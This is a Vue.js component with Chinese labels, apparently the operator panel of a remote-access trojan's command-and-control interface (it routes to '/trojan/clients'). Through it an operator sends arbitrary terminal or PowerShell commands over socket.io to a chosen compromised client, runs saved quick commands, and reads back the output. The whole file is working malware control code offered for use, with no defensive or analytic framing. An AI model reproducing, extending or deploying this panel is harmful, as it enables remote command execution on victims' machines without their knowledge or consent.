<template>
  <v-container>
    <!-- <div><span @click="$router.go(-1)" class="backLink">←返回</span></div> -->
    <v-btn @click="$router.go(-1)" class="mb-6"
      ><v-icon class="mr-3">fa-angle-left</v-icon>返回Clients</v-btn
    >
    <v-container class="d-flex justify-space-between">
      <h2>客户端ID: {{ id }}</h2>
      <p>设置</p>
    </v-container>
    <v-container class="d-flex justify-center align-center">
      <v-text-field
        @keypress.enter="submit"
        v-model="sshInput"
        name="name"
        label="输入终端命令"
        type="text"
      ></v-text-field>
      <v-btn @click="submit" class="ml-3">提交</v-btn>
      <v-switch v-model="powershell" label="powershell" class="ml-3"></v-switch>
      <v-btn @click="sshOutput = ''" style="margin-left: 10px">
        清空下方(ctrl+L)
      </v-btn>
      <v-menu offset-y>
        <template v-slot:activator="{ on }">
          <v-btn v-on="on" class="ml-3">快捷操作</v-btn>
        </template>
        <v-list>
          <template v-for="(i, index) in quickCmd">
            <v-list-item
              :key="index"
              @click="
                sshInput = i.cmd;
                submit();
              "
            >
              <v-list-item-content>
                <v-list-item-title>{{ i.name }}</v-list-item-title>
              </v-list-item-content>
              <v-icon>fa-close</v-icon>
            </v-list-item>
          </template>
        </v-list>
      </v-menu>
      <span style="margin-left: 10px; font-size: 0.9rem; color: green">{{
        sshStatus
      }}</span>
    </v-container>
    <v-container>
      <v-textarea
        label="终端回调结果"
        v-model="sshOutput"
        rows="9"
        ref="sshOutput"
        readonly
        id="outputTextarea"
      ></v-textarea>
    </v-container>
  </v-container>
</template>

<script>
// import io from "socket.io-client";

export default {
  name: "control",
  props: ["id"],
  data: function () {
    return {
      quickCmd: [],
      clientArr: window.clientArr,
      sshInput: "",
      sshOutput: "",
      sshStatus: "",
      interval: null,
      powershell: true,
      shortcut: {
        clearInput: null,
      },
    };
  },
  watch: {},
  beforeMount() {
    //注册快捷键事件
    this.shortcut.clearInput = document.documentElement.addEventListener(
      "keydown",
      (event) => {
        event = event || window.event;
        //清空输出结果
        if (event.key == "l" && event.ctrlKey) {
          event.preventDefault();
          this.sshOutput = "";
        }
      }
    );
    this.clientArr = window.clientArr;
    this.interval = setInterval(() => {
      if (window.cmdResult.changed) {
        this.sshStatus = "";
        if (window.cmdResult.data == "") {
          this.sshOutput = this.sshOutput.concat("\n当前命令返回了空的回调\n");
        } else {
          this.sshOutput = this.sshOutput.concat(window.cmdResult.data);
        }
        setTimeout(() => {
          // this.$refs.sshOutput.children[1].scrollTop =
          //   this.$refs.sshOutput.children[1].scrollHeight;
          // console.log(this.$refs.sshOutput);

          let dom = document.querySelector("#outputTextarea");
          dom.scrollTop = dom.scrollHeight;
        }, 100);
        // window.cmdResult.data = "";
        window.cmdResult.changed = false;
      }

      //快捷操作：localStorage
      if (window.localStorage.quickCmd) {
        this.quickCmd = JSON.parse(window.localStorage.quickCmd);
      }

      if (this.$myUtils.IdIndex(window.clientArr, this.id) == -1) {
        clearInterval(this.interval);
        // alert("此客户端已离线");
        this.$router.push("/trojan/clients");
      }
    }, 200);
  },
  beforeRouteLeave(to, from, next) {
    // window.cmdResult.data = "";
    window.cmdResult.changed = false;
    clearInterval(this.interval);

    //清除快捷键注册
    for (const key in this.shortcut) {
      if (Object.hasOwnProperty.call(this.shortcut, key)) {
        if (this.shortcut[key]) {
          removeEventListener(this.shortcut[key]);
        }
      }
    }
    next();
  },
  afterRouteEnter(to, from, next) {
    next();
  },
  methods: {
    submit() {
      if (!this.sshInput.length) return;
      this.sshStatus = "等待回调...";
      // eslint-disable-next-line no-undef
      if (this.powershell) {
        this.$store.state.io.emit(
          "apisendcmd",
          this.id,
          `powershell -command ${this.sshInput}`
        );
      } else {
        this.$store.state.io.emit("apisendcmd", this.id, this.sshInput);
      }
      // this.sshInput = "";
    },
  },
};
</script>

<style lang="scss"></style>
